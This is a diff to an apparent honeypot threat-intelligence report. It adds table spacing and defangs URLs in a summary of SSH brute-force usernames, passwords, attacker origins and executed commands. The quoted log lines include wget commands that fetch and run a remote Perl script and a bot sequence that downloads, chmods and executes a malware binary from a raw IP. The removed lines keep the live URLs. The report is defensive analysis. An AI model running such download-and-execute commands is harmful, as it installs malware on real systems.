@@ -27,6 +27,7 @@ pi	| 200
 
 The top 10 usernames attempted show a number of standard usernames which one would expect to see, such as ‘admin’, ‘root’, ‘support’ and ‘service’ and some interesting usernames as well. Of note, the username ‘usuario’ is the Spanish word for user. The username ‘ubnt’ is the default password for [Ubiquity’s UniFi Access Points]( https://help.ubnt.com/hc/en-us/articles/204909374-UniFi-What-is-the-default-username-password-for-UAPs-and-controller-), which have an SSH connection capability. The username ‘pi’ is also the default username for [Rasbian Linux]( https://www.raspberrypi.org/documentation/linux/usage/users.md), the standard operating system for Raspberry Pi’s. 
 The following table details the top 10 passwords attempted by attackers:
+
 Password |	Count
 ------------ | ------------
  	| 754
@@ -42,6 +43,7 @@ admin1234	| 422
 
 The top 10 passwords are what would be expected as standard for a honeypot, with a blank password, ‘password’ and ‘123456’ taking equal share of the top three attempted passwords. It is assessed that attackers would have been using a standard password dictionary file to brute force logins to the honeypot.
 The following table details the top 10 username and password combinations:
+
 Username/Password Combination |	Count
 ------------ | ------------
 root/	 | 688
@@ -70,6 +72,7 @@ The prominent presence of Vietnam in scanning and China in successful logins is 
 
 ### Sessions
 A session is defined as a successful login and the execution of commands within the honeypot. Of the 2074 successful logins, there were only 926 sessions with commands executed. The top 10 commands run on the honeypot are detailed in the following table:
+
 Command Entered |	Count
 ------------ | ------------
 uname -a	| 1606
@@ -78,8 +81,8 @@ ps x	| 74
 uname	| 42
 uname	| 42
 cat /proc/cpuinfo	|28
-wget https://rootr258.000webhostapp.com/arhive/perl.pl&&perl perl.pl&&perl perl.pl&&rm -rf perl.pl&&uname -a	| 23
-wget https://rootr258.000webhostapp.com/arhive/perl.pl	| 23
+wget hxxps://rootr258.000webhostapp.com/arhive/perl.pl&&perl perl.pl&&perl perl.pl&&rm -rf perl.pl&&uname -a	| 23
+wget hxxps://rootr258.000webhostapp.com/arhive/perl.pl	| 23
 uname -a && cat /etc/issue	| 22
 cat /etc/issue	| 22
 
@@ -89,7 +92,7 @@ Human vs Bot Interaction
 The Tango Honeypot Intelligence app provides data on what is assessed as human interaction and what is assessed as bot interaction. This assessment is performed based on the timestamps of the interaction. Interactions where the number of commands entered seem suspicious for the length of the session are often identified as bots, interactions that are longer will be identified as being potentially human. The following graph demonstrates the level of human versus bot interaction with the honeypot. 
  ![Human Vs Bot](/img/botVhuman.png)
 
-There were only 8 unique files downloaded to the honeypot with the majority of these being performed by suspected bots. A typical bot download would involve the use of the following command - wget http://157.52.151.116/a21jj curl -O http://157.52.151.116/a21jj chmod +x a21jj ./a21jj. This command downloads the piece of malware, makes it executable and then executes the file. The final command the attacker executes is – ls -la /var/run/gcc.pid. The presence of /var/run/gcc.pid confirms the presence of the [XOR DDOS Trojan]( https://blog.checkpoint.com/wp-content/uploads/2015/10/sb-report-threat-intelligence-groundhog.pdf).
+There were only 8 unique files downloaded to the honeypot with the majority of these being performed by suspected bots. A typical bot download would involve the use of the following command - wget hxxp://157.52.151.116/a21jj curl -O hxxp://157.52.151.116/a21jj chmod +x a21jj ./a21jj. This command downloads the piece of malware, makes it executable and then executes the file. The final command the attacker executes is – ls -la /var/run/gcc.pid. The presence of /var/run/gcc.pid confirms the presence of the [XOR DDOS Trojan]( https://blog.checkpoint.com/wp-content/uploads/2015/10/sb-report-threat-intelligence-groundhog.pdf).
 There were sessions where attackers attempted to extract system information from the system, this ranged from data on the system itself such as iptables and cpu information through to extracting SSH keys and /etc/shadow and /etc/password. In one occurrence, the attacker pipped this system information into gzip and then encoded it using base64. However, in all sessions in which the attacker probed for system information and prepared it for extraction there is no evidence of any extraction occurring from the system. 
 The third type of session that was observed was one in which the attacker will login to the system and then immediately clear all history and remove all log files. The attacker will then go through and recreate each of these files using the touch command. This behaviour was performed twice by one individual IP address located in New Delhi, India with no evidence that they had connected to the honeypot prior. 
 
